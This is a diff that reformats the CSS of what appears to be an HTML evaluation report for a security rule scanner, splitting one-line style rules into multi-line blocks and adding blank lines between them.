@@ -22,6 +22,7 @@
     --radius: 16px;
     --max: 1520px;
   }
+
   @media (prefers-color-scheme: dark) {
     :root:not([data-theme="light"]) {
       --bg: #0d141d;
@@ -41,6 +42,7 @@
       --shadow: 0 18px 45px rgba(0, 0, 0, 0.34);
     }
   }
+
   :root[data-theme="dark"] {
     --bg: #0d141d;
     --panel: #131c28;
@@ -59,8 +61,16 @@
     --shadow: 0 18px 45px rgba(0, 0, 0, 0.34);
   }
 
-  * { box-sizing: border-box; }
-  html, body { margin: 0; padding: 0; }
+  * {
+    box-sizing: border-box;
+  }
+
+  html,
+  body {
+    margin: 0;
+    padding: 0;
+  }
+
   body {
     background: var(--bg);
     color: var(--text);
@@ -69,9 +79,21 @@
     -webkit-font-smoothing: antialiased;
     text-rendering: optimizeLegibility;
   }
-  a { color: inherit; }
-  code, pre, .mono { font-family: var(--mono); }
-  .mono { font-variant-numeric: tabular-nums; }
+
+  a {
+    color: inherit;
+  }
+
+  code,
+  pre,
+  .mono {
+    font-family: var(--mono);
+  }
+
+  .mono {
+    font-variant-numeric: tabular-nums;
+  }
+
   :focus-visible {
     outline: 2px solid var(--accent);
     outline-offset: 3px;
@@ -83,6 +105,7 @@
     margin: 0 auto;
     padding: 28px 32px 72px;
   }
+
   .hero {
     background: linear-gradient(180deg, color-mix(in srgb, var(--accent) 10%, var(--panel)) 0%, var(--panel) 62%);
     border: 1px solid var(--line);
@@ -91,6 +114,7 @@
     padding: clamp(24px, 4vw, 40px);
     display: block;
   }
+
   .eyebrow {
     display: inline-flex;
     gap: 10px;
@@ -102,13 +126,22 @@
     color: var(--accent);
     margin-bottom: 18px;
   }
+
   .eyebrow::after {
     content: "";
     height: 1px;
     width: 38px;
     background: var(--line);
   }
-  h1, h2, h3, h4 { margin: 0; text-wrap: balance; }
+
+  h1,
+  h2,
+  h3,
+  h4 {
+    margin: 0;
+    text-wrap: balance;
+  }
+
   h1 {
     font-family: var(--serif);
     font-size: clamp(36px, 5vw, 58px);
@@ -121,6 +154,7 @@
     gap: 10px;
     margin-top: 16px;
   }
+
   .summary-item {
     display: grid;
     grid-template-columns: 72px 1fr;
@@ -131,12 +165,14 @@
     border-radius: 14px;
     background: var(--panel);
   }
+
   .summary-item b {
     font-family: var(--mono);
     font-size: 12px;
     color: var(--accent);
     letter-spacing: .06em;
   }
+
   .summary-item p {
     margin: 0;
     color: var(--muted);
@@ -148,6 +184,7 @@
     margin-top: 22px;
     display: block;
   }
+
   .section,
   .evidence,
   .callout,
@@ -158,33 +195,48 @@
     box-shadow: var(--shadow);
   }
 
-  .content { display: grid; gap: 18px; }
-  .section { padding: clamp(20px, 3vw, 28px); }
+  .content {
+    display: grid;
+    gap: 18px;
+  }
+
+  .section {
+    padding: clamp(20px, 3vw, 28px);
+  }
+
   .section h2 {
     font-family: var(--serif);
     font-size: clamp(24px, 2.8vw, 32px);
     line-height: 1.2;
     margin-bottom: 12px;
   }
-  .section p { margin: 0 0 12px; color: var(--text); }
+
+  .section p {
+    margin: 0 0 12px;
+    color: var(--text);
+  }
+
   .section .lead {
     color: var(--muted);
     max-width: 100%;
     font-size: 15px;
     line-height: 1.68;
   }
+
   .grid-2 {
     display: grid;
     grid-template-columns: repeat(2, minmax(0, 1fr));
     gap: 14px;
     margin-top: 14px;
   }
+
   .grid-3 {
     display: grid;
     grid-template-columns: repeat(3, minmax(0, 1fr));
     gap: 14px;
     margin-top: 14px;
   }
+
   .card {
     border: 1px solid var(--line);
     background: var(--panel-2);
@@ -192,11 +244,13 @@
     padding: 16px;
     min-width: 0;
   }
+
   .card h3 {
     font-family: var(--serif);
     font-size: 18px;
     margin-bottom: 8px;
   }
+
   .card h4 {
     font-family: var(--mono);
     font-size: 12px;
@@ -205,23 +259,27 @@
     text-transform: uppercase;
     margin-bottom: 10px;
   }
+
   .card ul {
     margin: 0;
     padding-left: 18px;
     color: var(--text);
   }
+
   .card li {
     margin: 6px 0;
     color: var(--muted);
     font-size: 13.5px;
     line-height: 1.55;
   }
+
   .badge-row {
     display: flex;
     flex-wrap: wrap;
     gap: 8px;
     margin-top: 14px;
   }
+
   .badge {
     display: inline-flex;
     align-items: center;
@@ -233,11 +291,31 @@
     background: var(--panel);
     color: var(--text);
   }
-  .badge.ok { color: var(--ok); background: var(--ok-soft); border-color: color-mix(in srgb, var(--ok) 25%, var(--line)); }
-  .badge.warn { color: var(--warn); background: var(--warn-soft); border-color: color-mix(in srgb, var(--warn) 25%, var(--line)); }
-  .badge.danger { color: var(--danger); background: var(--danger-soft); border-color: color-mix(in srgb, var(--danger) 25%, var(--line)); }
 
-  .process { display: grid; gap: 12px; margin-top: 14px; }
+  .badge.ok {
+    color: var(--ok);
+    background: var(--ok-soft);
+    border-color: color-mix(in srgb, var(--ok) 25%, var(--line));
+  }
+
+  .badge.warn {
+    color: var(--warn);
+    background: var(--warn-soft);
+    border-color: color-mix(in srgb, var(--warn) 25%, var(--line));
+  }
+
+  .badge.danger {
+    color: var(--danger);
+    background: var(--danger-soft);
+    border-color: color-mix(in srgb, var(--danger) 25%, var(--line));
+  }
+
+  .process {
+    display: grid;
+    gap: 12px;
+    margin-top: 14px;
+  }
+
   .step {
     display: grid;
     grid-template-columns: 96px minmax(0, 1fr);
@@ -247,6 +325,7 @@
     border: 1px solid var(--line);
     background: var(--panel);
   }
+
   .step .num {
     font-family: var(--mono);
     font-size: 12px;
@@ -254,20 +333,29 @@
     letter-spacing: .08em;
     text-transform: uppercase;
   }
-  .step .body { min-width: 0; }
+
+  .step .body {
+    min-width: 0;
+  }
+
   .step .body strong {
     display: block;
     margin-bottom: 6px;
     font-family: var(--serif);
     font-size: 18px;
   }
+
   .step .body p,
   .step .body li {
     color: var(--muted);
     font-size: 13.5px;
     line-height: 1.6;
   }
-  .step .body ul { margin: 8px 0 0; padding-left: 18px; }
+
+  .step .body ul {
+    margin: 8px 0 0;
+    padding-left: 18px;
+  }
 
   .table-wrap {
     overflow-x: auto;
@@ -277,6 +365,7 @@
     background: var(--panel);
     box-shadow: var(--shadow);
   }
+
   table {
     width: 100%;
     min-width: 920px;
@@ -284,7 +373,9 @@
     border-spacing: 0;
     background: var(--panel);
   }
-  th, td {
+
+  th,
+  td {
     padding: 14px 16px;
     border-bottom: 1px solid var(--line);
     vertical-align: top;
@@ -292,6 +383,7 @@
     font-size: 13.5px;
     line-height: 1.65;
   }
+
   th {
     font-family: var(--mono);
     font-size: 11px;
@@ -300,28 +392,46 @@
     color: var(--muted);
     background: linear-gradient(180deg, color-mix(in srgb, var(--accent) 7%, var(--panel)) 0%, color-mix(in srgb, var(--panel) 88%, var(--panel-2)) 100%);
   }
-  table thead th:first-child { border-top-left-radius: 18px; }
-  table thead th:last-child { border-top-right-radius: 18px; }
+
+  table thead th:first-child {
+    border-top-left-radius: 18px;
+  }
+
+  table thead th:last-child {
+    border-top-right-radius: 18px;
+  }
+
   tbody tr:nth-child(odd) td {
     background: color-mix(in srgb, var(--panel) 86%, var(--panel-2));
   }
+
   tbody tr:nth-child(even) td {
     background: color-mix(in srgb, var(--panel-2) 82%, var(--panel));
   }
+
   tbody tr:hover td {
     background: color-mix(in srgb, var(--accent) 7%, var(--panel));
   }
+
   tbody td:first-child {
     font-family: var(--mono);
     font-weight: 700;
     color: var(--accent);
     white-space: nowrap;
   }
+
   tbody td:nth-child(2) {
     white-space: nowrap;
   }
-  tbody tr:last-child td { border-bottom: 0; }
-  td small { color: var(--muted); }
+
+  tbody tr:last-child td {
+    border-bottom: 0;
+  }
+
+  td small {
+    color: var(--muted);
+  }
+
   /* 规则库现代化设计体系 */
   .rule-dashboard {
     margin-top: 20px;
@@ -725,8 +835,13 @@
     gap: 8px;
   }
 
-  .bm-goal-card.benign .bm-goal-title { color: var(--success, #10b981); }
-  .bm-goal-card.malicious .bm-goal-title { color: var(--danger, #ef4444); }
+  .bm-goal-card.benign .bm-goal-title {
+    color: var(--success, #10b981);
+  }
+
+  .bm-goal-card.malicious .bm-goal-title {
+    color: var(--danger, #ef4444);
+  }
 
   .bm-goal-badge {
     font-size: 11px;
@@ -1214,33 +1329,46 @@
   .rule-table-modern tr.is-hidden {
     display: none !important;
   }
+
   .callout {
     margin-top: 14px;
     padding: 16px 18px;
     border-left: 4px solid var(--accent);
     background: color-mix(in srgb, var(--accent) 8%, var(--panel));
   }
-  .callout strong { color: var(--accent); }
+
+  .callout strong {
+    color: var(--accent);
+  }
+
   .callout.warn {
     border-left-color: var(--warn);
     background: color-mix(in srgb, var(--warn) 8%, var(--panel));
   }
+
   .callout.danger {
     border-left-color: var(--danger);
     background: color-mix(in srgb, var(--danger) 8%, var(--panel));
   }
-  .evidence { padding: 18px; margin-top: 14px; }
+
+  .evidence {
+    padding: 18px;
+    margin-top: 14px;
+  }
+
   .evidence-list {
     display: grid;
     gap: 12px;
     margin-top: 12px;
   }
+
   .evidence-item {
     padding: 14px 15px;
     border: 1px solid var(--line);
     border-radius: 12px;
     background: var(--panel-2);
   }
+
   .evidence-item .src {
     font-family: var(--mono);
     font-size: 11px;
@@ -1248,24 +1376,28 @@
     letter-spacing: .06em;
     margin-bottom: 6px;
   }
+
   .evidence-item p {
     margin: 0;
     font-size: 13.5px;
     color: var(--muted);
     line-height: 1.6;
   }
+
   .kpi {
     display: grid;
     grid-template-columns: repeat(4, minmax(0, 1fr));
     gap: 12px;
     margin-top: 14px;
   }
+
   .kpi-card {
     border: 1px solid var(--line);
     border-radius: 14px;
     background: var(--panel);
     padding: 14px;
   }
+
   .kpi-card .num {
     font-family: var(--mono);
     font-size: 28px;
@@ -1274,42 +1406,51 @@
     color: var(--text);
     font-variant-numeric: tabular-nums;
   }
+
   .kpi-card .label {
     margin-top: 8px;
     color: var(--muted);
     font-size: 12.5px;
     line-height: 1.5;
   }
+
   .footer {
     margin-top: 18px;
     padding: 14px 6px 0;
     color: var(--muted);
     font-size: 12.5px;
   }
+
   .footnotes {
     display: grid;
     gap: 10px;
     margin-top: 10px;
   }
+
   .footnotes .note {
     padding: 12px 14px;
     border-radius: 12px;
     border: 1px solid var(--line);
     background: var(--panel);
   }
-  .footnotes .note b { color: var(--text); }
+
+  .footnotes .note b {
+    color: var(--text);
+  }
 
   .chart-grid {
     display: grid;
     gap: 14px;
     margin-top: 14px;
   }
+
   .chart-card {
     border: 1px solid var(--line);
     border-radius: 16px;
     background: var(--panel);
     padding: 16px;
   }
+
   .chart-title {
     display: flex;
     flex-wrap: wrap;
@@ -1318,28 +1459,37 @@
     align-items: baseline;
     margin-bottom: 12px;
   }
+
   .chart-title h3 {
     font-family: var(--serif);
     font-size: 18px;
   }
+
   .chart-title .hint {
     font-size: 12px;
     color: var(--muted);
     font-family: var(--mono);
   }
-  .bars { display: grid; gap: 12px; }
+
+  .bars {
+    display: grid;
+    gap: 12px;
+  }
+
   .bar-row {
     display: grid;
     grid-template-columns: 140px minmax(0, 1fr) 72px;
     gap: 10px;
     align-items: center;
   }
+
   .bar-row .name {
     font-family: var(--mono);
     font-size: 12px;
     color: var(--muted);
     letter-spacing: .04em;
   }
+
   .track {
     position: relative;
     height: 14px;
@@ -1348,21 +1498,33 @@
     overflow: hidden;
     border: 1px solid var(--line);
   }
+
   .fill {
     position: absolute;
     inset: 0 auto 0 0;
     border-radius: inherit;
     background: linear-gradient(90deg, var(--accent), color-mix(in srgb, var(--accent) 55%, var(--ok)));
   }
-  .fill.ok { background: linear-gradient(90deg, var(--ok), color-mix(in srgb, var(--ok) 45%, var(--accent))); }
-  .fill.warn { background: linear-gradient(90deg, var(--warn), color-mix(in srgb, var(--warn) 45%, var(--danger))); }
-  .fill.danger { background: linear-gradient(90deg, var(--danger), color-mix(in srgb, var(--danger) 45%, var(--warn))); }
+
+  .fill.ok {
+    background: linear-gradient(90deg, var(--ok), color-mix(in srgb, var(--ok) 45%, var(--accent)));
+  }
+
+  .fill.warn {
+    background: linear-gradient(90deg, var(--warn), color-mix(in srgb, var(--warn) 45%, var(--danger)));
+  }
+
+  .fill.danger {
+    background: linear-gradient(90deg, var(--danger), color-mix(in srgb, var(--danger) 45%, var(--warn)));
+  }
+
   .bar-row .value {
     text-align: right;
     font-family: var(--mono);
     font-size: 12px;
     color: var(--text);
   }
+
   .stack {
     display: flex;
     height: 24px;
@@ -1371,6 +1533,7 @@
     border: 1px solid var(--line);
     background: var(--panel-2);
   }
+
   .segment {
     display: flex;
     align-items: center;
@@ -1381,15 +1544,26 @@
     color: #fff;
     padding: 0 8px;
   }
-  .segment.static { background: #56707b; }
-  .segment.ok { background: var(--ok); }
-  .segment.uncertain { background: var(--warn); }
+
+  .segment.static {
+    background: #56707b;
+  }
+
+  .segment.ok {
+    background: var(--ok);
+  }
+
+  .segment.uncertain {
+    background: var(--warn);
+  }
+
   .legend {
     display: flex;
     flex-wrap: wrap;
     gap: 8px;
     margin-top: 10px;
   }
+
   .legend .item {
     display: inline-flex;
     align-items: center;
@@ -1401,20 +1575,32 @@
     font-size: 12px;
     color: var(--muted);
   }
+
   .swatch {
     width: 10px;
     height: 10px;
     border-radius: 999px;
     background: var(--accent);
   }
-  .swatch.ok { background: var(--ok); }
-  .swatch.warn { background: var(--warn); }
-  .swatch.static { background: #56707b; }
+
+  .swatch.ok {
+    background: var(--ok);
+  }
+
+  .swatch.warn {
+    background: var(--warn);
+  }
+
+  .swatch.static {
+    background: #56707b;
+  }
+
   .mini-note {
     margin-top: 10px;
     color: var(--muted);
     font-size: 12.5px;
   }
+
   .codebox {
     margin-top: 14px;
     padding: 14px 16px;
@@ -1427,22 +1613,26 @@
     color: var(--text);
     white-space: pre;
   }
+
   .spec-grid {
     display: grid;
     gap: 14px;
     margin-top: 14px;
   }
+
   .spec {
     border: 1px solid var(--line);
     border-radius: 14px;
     background: var(--panel);
     padding: 16px;
   }
+
   .spec h3 {
     font-family: var(--serif);
     font-size: 18px;
     margin-bottom: 8px;
   }
+
   .spec .tag {
     font-family: var(--mono);
     font-size: 11px;
@@ -1451,12 +1641,19 @@
     color: var(--accent);
     margin-bottom: 10px;
   }
-  .spec p, .spec li {
+
+  .spec p,
+  .spec li {
     color: var(--muted);
     font-size: 13.5px;
     line-height: 1.6;
   }
-  .spec ul { margin: 0; padding-left: 18px; }
+
+  .spec ul {
+    margin: 0;
+    padding-left: 18px;
+  }
+
   figure.framework-figure {
     margin: 18px 0 0;
     padding: 18px;
@@ -1466,37 +1663,45 @@
     box-shadow: var(--shadow);
     color: var(--text);
   }
+
   svg.framework-svg {
     display: block;
     width: 100%;
     height: auto;
     color: var(--text);
   }
+
   svg.framework-svg text {
     font-family: var(--sans);
   }
+
   .fw-box {
     fill: var(--panel);
     stroke: var(--line);
     stroke-width: 1.6;
   }
+
   .fw-box--accent {
     fill: color-mix(in srgb, var(--accent) 10%, var(--panel));
     stroke: color-mix(in srgb, var(--accent) 50%, var(--line));
   }
+
   .fw-box--warn {
     fill: color-mix(in srgb, var(--warn) 14%, var(--panel));
     stroke: color-mix(in srgb, var(--warn) 50%, var(--line));
   }
+
   .fw-box--chip {
     fill: color-mix(in srgb, var(--panel-2) 88%, var(--panel));
     stroke: color-mix(in srgb, var(--line) 84%, var(--muted));
   }
+
   .fw-box--future {
     fill: color-mix(in srgb, var(--accent) 4%, var(--panel));
     stroke: color-mix(in srgb, var(--accent) 30%, var(--line));
     stroke-dasharray: 5 6;
   }
+
   .fw-line {
     fill: none;
     stroke: currentColor;
@@ -1506,23 +1711,27 @@
     vector-effect: non-scaling-stroke;
     marker-end: url(#fw-arrow);
   }
+
   .fw-line--accent {
     color: var(--accent);
     stroke: currentColor;
     marker-end: url(#fw-arrow-accent);
   }
+
   .fw-line--muted {
     color: color-mix(in srgb, var(--muted) 78%, var(--line));
     stroke: currentColor;
     stroke-dasharray: 2 8;
     opacity: 0.82;
   }
+
   .fw-line--warn {
     color: var(--warn);
     stroke: currentColor;
     stroke-dasharray: 7 8;
     marker-end: url(#fw-arrow-warn);
   }
+
   .fw-line--future {
     color: color-mix(in srgb, var(--accent) 55%, var(--muted));
     stroke: currentColor;
@@ -1530,24 +1739,29 @@
     marker-end: url(#fw-arrow-accent);
     opacity: 0.82;
   }
+
   .fw-title {
     font-size: 18px;
     font-weight: 700;
     fill: var(--text);
   }
+
   .fw-label {
     font-size: 12px;
     fill: var(--muted);
   }
+
   .fw-small {
     font-size: 11px;
     fill: var(--muted);
   }
+
   .fw-code {
     font-size: 11px;
     fill: var(--text);
     font-family: var(--mono);
   }
+
   figure.framework-figure figcaption {
     margin-top: 12px;
     color: var(--muted);
@@ -1562,11 +1776,13 @@
     gap: 16px;
     margin-top: 14px;
   }
+
   @media (max-width: 860px) {
     .cm-grid-container {
       grid-template-columns: 1fr;
     }
   }
+
   .cm-card {
     border: 1px solid var(--line);
     background: var(--panel-2);
@@ -1576,10 +1792,12 @@
     flex-direction: column;
     gap: 12px;
   }
+
   .cm-card.tuned {
     border-color: color-mix(in srgb, var(--accent) 40%, var(--line));
     background: color-mix(in srgb, var(--accent) 4%, var(--panel-2));
   }
+
   .cm-header {
     display: flex;
     align-items: center;
@@ -1587,6 +1805,7 @@
     flex-wrap: wrap;
     gap: 8px;
   }
+
   .cm-title {
     font-family: var(--serif);
     font-size: 16px;
@@ -1596,6 +1815,7 @@
     gap: 6px;
     margin: 0;
   }
+
   .cm-badge {
     font-family: var(--mono);
     font-size: 11px;
@@ -1605,61 +1825,72 @@
     border: 1px solid var(--line);
     color: var(--muted);
   }
+
   .cm-badge.active {
     background: color-mix(in srgb, var(--accent) 15%, var(--panel));
     border-color: var(--accent);
     color: var(--accent);
     font-weight: 600;
   }
+
   .cm-table {
     width: 100%;
     border-collapse: separate;
     border-spacing: 6px;
     font-family: var(--mono);
   }
+
   .cm-cell {
     padding: 10px 12px;
     border-radius: 10px;
     border: 1px solid var(--line);
     text-align: center;
   }
+
   .cm-cell .cm-val {
     font-size: 20px;
     font-weight: 700;
     line-height: 1.1;
   }
+
   .cm-cell .cm-lbl {
     font-size: 11px;
     margin-top: 4px;
     font-family: var(--sans);
     opacity: 0.85;
   }
+
   .cm-cell.tn {
     background: var(--ok-soft);
     border-color: color-mix(in srgb, var(--ok) 30%, var(--line));
     color: var(--ok);
   }
+
   .cm-cell.tp {
     background: color-mix(in srgb, var(--accent) 14%, var(--panel));
     border-color: color-mix(in srgb, var(--accent) 35%, var(--line));
     color: var(--accent);
   }
+
   .cm-cell.fp {
     background: var(--warn-soft);
     border-color: color-mix(in srgb, var(--warn) 35%, var(--line));
     color: var(--warn);
   }
+
   .cm-cell.fn {
     background: var(--danger-soft);
     border-color: color-mix(in srgb, var(--danger) 35%, var(--line));
     color: var(--danger);
   }
+
   .cm-summary-pills {
     display: flex;
     flex-wrap: wrap;
     gap: 8px;
     font-size: 12px;
   }
+
   .cm-pill {
     padding: 4px 10px;
     border-radius: 6px;
@@ -1668,19 +1899,23 @@
     color: var(--text);
     font-family: var(--mono);
   }
+
   .cm-pill strong {
     color: var(--accent);
   }
+
   .cm-pill.highlight {
     background: color-mix(in srgb, var(--accent) 10%, var(--panel));
     border-color: color-mix(in srgb, var(--accent) 30%, var(--line));
   }
+
   .case-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
     gap: 14px;
     margin-top: 14px;
   }
+
   .case-card {
     background: var(--panel-2);
     border: 1px solid var(--line);
@@ -1690,12 +1925,14 @@
     flex-direction: column;
     gap: 8px;
   }
+
   .case-head {
     display: flex;
     align-items: center;
     justify-content: space-between;
     gap: 8px;
   }
+
   .case-tag {
     font-family: var(--mono);
     font-size: 11px;
@@ -1703,32 +1940,38 @@
     border-radius: 4px;
     font-weight: 600;
   }
+
   .case-tag.suppress {
     background: var(--ok-soft);
     color: var(--ok);
     border: 1px solid color-mix(in srgb, var(--ok) 30%, var(--line));
   }
+
   .case-tag.chain {
     background: var(--danger-soft);
     color: var(--danger);
     border: 1px solid color-mix(in srgb, var(--danger) 30%, var(--line));
   }
+
   .case-tag.fallback {
     background: var(--warn-soft);
     color: var(--warn);
     border: 1px solid color-mix(in srgb, var(--warn) 30%, var(--line));
   }
+
   .case-title {
     font-size: 13.5px;
     font-weight: 700;
     color: var(--text);
   }
+
   .case-desc {
     font-size: 12.5px;
     color: var(--muted);
     line-height: 1.6;
     margin: 0;
   }
+
   /* 图表与流程图自适应容器 */
   figure.chart-figure {
     margin: 14px 0 0;
@@ -1738,6 +1981,7 @@
     background: var(--panel-2);
     overflow-x: auto;
   }
+
   svg.metric-svg,
   svg.flow-svg {
     display: block;
@@ -1745,12 +1989,14 @@
     min-width: 760px;
     height: auto;
   }
+
   .metric-pill-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
     gap: 10px;
     margin-top: 14px;
   }
+
   .metric-pill-card {
     padding: 12px 14px;
     border-radius: 12px;
@@ -1760,6 +2006,7 @@
     flex-direction: column;
     gap: 4px;
   }
+
   .metric-pill-name {
     font-size: 11.5px;
     color: var(--muted);
@@ -1767,19 +2014,27 @@
     align-items: center;
     justify-content: space-between;
   }
+
   .metric-pill-val {
     font-family: var(--mono);
     font-size: 15px;
     font-weight: 700;
     color: var(--text);
   }
+
   .metric-pill-delta {
     font-family: var(--mono);
     font-size: 11px;
     font-weight: 600;
   }
-  .metric-pill-delta.up { color: var(--ok); }
-  .metric-pill-delta.down-good { color: var(--ok); }
+
+  .metric-pill-delta.up {
+    color: var(--ok);
+  }
+
+  .metric-pill-delta.down-good {
+    color: var(--ok);
+  }
 
   /* 100样本分流问答卡片 */
   .flow-qa-grid {
@@ -1788,11 +2043,13 @@
     gap: 14px;
     margin-top: 16px;
   }
+
   @media (max-width: 880px) {
     .flow-qa-grid {
       grid-template-columns: 1fr;
     }
   }
+
   .flow-qa-card {
     border: 1px solid var(--line);
     border-radius: 14px;
@@ -1802,24 +2059,29 @@
     flex-direction: column;
     gap: 10px;
   }
+
   .flow-qa-card.bypass {
     border-color: color-mix(in srgb, #526e82 50%, var(--line));
     background: color-mix(in srgb, #526e82 6%, var(--panel-2));
   }
+
   .flow-qa-card.arbitrated {
     border-color: color-mix(in srgb, var(--ok) 40%, var(--line));
     background: color-mix(in srgb, var(--ok) 5%, var(--panel-2));
   }
+
   .flow-qa-card.failclosed {
     border-color: color-mix(in srgb, var(--warn) 45%, var(--line));
     background: color-mix(in srgb, var(--warn) 6%, var(--panel-2));
   }
+
   .flow-qa-head {
     display: flex;
     align-items: center;
     justify-content: space-between;
     gap: 8px;
   }
+
   .flow-qa-badge {
     font-family: var(--mono);
     font-size: 11px;
@@ -1827,20 +2089,38 @@
     border-radius: 6px;
     font-weight: 700;
   }
-  .flow-qa-badge.bypass { background: #1a2730; color: #8ba0b3; border: 1px solid #354e60; }
-  .flow-qa-badge.arbitrated { background: var(--ok-soft); color: var(--ok); border: 1px solid color-mix(in srgb, var(--ok) 35%, var(--line)); }
-  .flow-qa-badge.failclosed { background: var(--warn-soft); color: var(--warn); border: 1px solid color-mix(in srgb, var(--warn) 35%, var(--line)); }
+
+  .flow-qa-badge.bypass {
+    background: #1a2730;
+    color: #8ba0b3;
+    border: 1px solid #354e60;
+  }
+
+  .flow-qa-badge.arbitrated {
+    background: var(--ok-soft);
+    color: var(--ok);
+    border: 1px solid color-mix(in srgb, var(--ok) 35%, var(--line));
+  }
+
+  .flow-qa-badge.failclosed {
+    background: var(--warn-soft);
+    color: var(--warn);
+    border: 1px solid color-mix(in srgb, var(--warn) 35%, var(--line));
+  }
+
   .flow-qa-title {
     font-size: 14px;
     font-weight: 700;
     color: var(--text);
   }
+
   .flow-qa-desc {
     font-size: 12.5px;
     color: var(--muted);
     line-height: 1.65;
     margin: 0;
   }
+
   .flow-qa-desc strong {
     color: var(--text);
   }
@@ -1853,6 +2133,7 @@
     background: var(--panel-2);
     overflow-x: auto;
   }
+
   .matrix-table {
     width: 100%;
     border-collapse: collapse;
@@ -1860,6 +2141,7 @@
     text-align: left;
     white-space: nowrap;
   }
+
   .matrix-table th {
     background: var(--panel);
     color: var(--muted);
@@ -1869,17 +2151,21 @@
     border-bottom: 1px solid var(--line);
     letter-spacing: 0.02em;
   }
+
   .matrix-table td {
     padding: 10px 14px;
     border-bottom: 1px solid var(--line);
     color: var(--text);
   }
+
   .matrix-table tr:hover td {
     background: color-mix(in srgb, var(--accent) 4%, transparent);
   }
+
   .matrix-table tr.group-sep td {
     border-top: 2px solid var(--line);
   }
+
   .mode-badge {
     display: inline-flex;
     align-items: center;
@@ -1890,24 +2176,39 @@
     padding: 2px 8px;
     border-radius: 6px;
   }
+
   .mode-badge.pure {
     background: color-mix(in srgb, var(--muted) 15%, transparent);
     color: var(--muted);
     border: 1px solid color-mix(in srgb, var(--muted) 30%, transparent);
   }
+
   .mode-badge.static-llm {
     background: color-mix(in srgb, var(--accent) 15%, transparent);
     color: var(--accent);
     border: 1px solid color-mix(in srgb, var(--accent) 35%, transparent);
   }
+
   .val-highlight {
     font-weight: 700;
     font-family: var(--mono);
   }
-  .val-highlight.good { color: var(--ok); }
-  .val-highlight.warn { color: var(--warn); }
-  .val-highlight.accent { color: var(--accent); }
-  .val-highlight.bad { color: var(--danger); }
+
+  .val-highlight.good {
+    color: var(--ok);
+  }
+
+  .val-highlight.warn {
+    color: var(--warn);
+  }
+
+  .val-highlight.accent {
+    color: var(--accent);
+  }
+
+  .val-highlight.bad {
+    color: var(--danger);
+  }
 
   /* 评测指标定义与释义卡片 */
   .metrics-glossary-section {
@@ -1918,6 +2219,7 @@
     background: var(--panel);
     padding: 20px 22px;
   }
+
   .metrics-glossary-head {
     display: flex;
     flex-wrap: wrap;
@@ -1928,6 +2230,7 @@
     padding-bottom: 12px;
     border-bottom: 1px solid var(--line);
   }
+
   .glossary-badge {
     font-size: 14.5px;
     font-weight: 700;
@@ -1936,20 +2239,24 @@
     align-items: center;
     gap: 6px;
   }
+
   .glossary-desc {
     font-size: 12.5px;
     color: var(--muted);
   }
+
   .metrics-glossary-grid {
     display: grid;
     grid-template-columns: repeat(2, 1fr);
     gap: 14px;
   }
+
   @media (max-width: 960px) {
     .metrics-glossary-grid {
       grid-template-columns: 1fr;
     }
   }
+
   .glossary-card {
     border: 1px solid var(--line);
     border-radius: 12px;
@@ -1959,9 +2266,11 @@
     flex-direction: column;
     gap: 6px;
   }
+
   .glossary-card.full-width {
     grid-column: 1 / -1;
   }
+
   .glossary-card .g-header {
     display: flex;
     align-items: center;
@@ -1969,11 +2278,13 @@
     gap: 8px;
     margin-bottom: 2px;
   }
+
   .glossary-card .g-title {
     font-size: 14px;
     font-weight: 700;
     color: var(--text);
   }
+
   .glossary-card .g-formula {
     font-family: var(--mono);
     font-size: 11px;
@@ -1984,6 +2295,7 @@
     color: var(--accent);
     font-weight: 600;
   }
+
   .glossary-card .g-meaning,
   .glossary-card .g-sec {
     font-size: 12.5px;
@@ -1991,26 +2303,31 @@
     margin: 0;
     color: var(--muted);
   }
+
   .glossary-card .g-meaning strong,
   .glossary-card .g-sec strong {
     color: var(--text);
   }
+
   .cm-chips-grid {
     display: grid;
     grid-template-columns: repeat(4, 1fr);
     gap: 10px;
     margin-top: 6px;
   }
+
   @media (max-width: 1060px) {
     .cm-chips-grid {
       grid-template-columns: repeat(2, 1fr);
     }
   }
+
   @media (max-width: 640px) {
     .cm-chips-grid {
       grid-template-columns: 1fr;
     }
   }
+
   .cm-chip {
     padding: 10px 12px;
     border-radius: 10px;
@@ -2020,36 +2337,55 @@
     flex-direction: column;
     gap: 4px;
   }
+
   .cm-chip.tp {
     border-color: color-mix(in srgb, var(--accent) 35%, var(--line));
     background: color-mix(in srgb, var(--accent) 6%, var(--panel));
   }
-  .cm-chip.tp .chip-title { color: var(--accent); }
+
+  .cm-chip.tp .chip-title {
+    color: var(--accent);
+  }
+
   .cm-chip.fp {
     border-color: color-mix(in srgb, var(--warn) 35%, var(--line));
     background: color-mix(in srgb, var(--warn) 6%, var(--panel));
   }
-  .cm-chip.fp .chip-title { color: var(--warn); }
+
+  .cm-chip.fp .chip-title {
+    color: var(--warn);
+  }
+
   .cm-chip.tn {
     border-color: color-mix(in srgb, var(--ok) 35%, var(--line));
     background: color-mix(in srgb, var(--ok) 6%, var(--panel));
   }
-  .cm-chip.tn .chip-title { color: var(--ok); }
+
+  .cm-chip.tn .chip-title {
+    color: var(--ok);
+  }
+
   .cm-chip.fn {
     border-color: color-mix(in srgb, var(--danger) 35%, var(--line));
     background: color-mix(in srgb, var(--danger) 6%, var(--panel));
   }
-  .cm-chip.fn .chip-title { color: var(--danger); }
+
+  .cm-chip.fn .chip-title {
+    color: var(--danger);
+  }
+
   .cm-chip .chip-title {
     font-family: var(--mono);
     font-size: 11.5px;
     font-weight: 700;
   }
+
   .cm-chip .chip-desc {
     font-size: 11.5px;
     line-height: 1.5;
     color: var(--muted);
   }
+
   .cm-chip .chip-desc strong {
     color: var(--text);
   }
@@ -2061,6 +2397,7 @@
     gap: 14px;
     margin-top: 14px;
   }
+
   .family-compare-card {
     background: var(--panel-2);
     border: 1px solid var(--line);
@@ -2070,18 +2407,22 @@
     flex-direction: column;
     gap: 10px;
   }
+
   .family-compare-card.benign-side {
     border-left: 4px solid var(--ok);
   }
+
   .family-compare-card.malicious-side {
     border-left: 4px solid var(--danger);
   }
+
   .family-card-head {
     display: flex;
     align-items: center;
     justify-content: space-between;
     gap: 8px;
   }
+
   .family-dual-bars {
     display: flex;
     flex-direction: column;
@@ -2091,16 +2432,19 @@
     border-radius: 8px;
     border: 1px solid var(--line);
   }
+
   .bar-row-item {
     display: flex;
     align-items: center;
     justify-content: space-between;
     font-size: 11.5px;
   }
+
   .bar-row-item .label {
     color: var(--muted);
     width: 110px;
   }
+
   .bar-row-item .val {
     font-family: var(--mono);
     font-weight: 700;
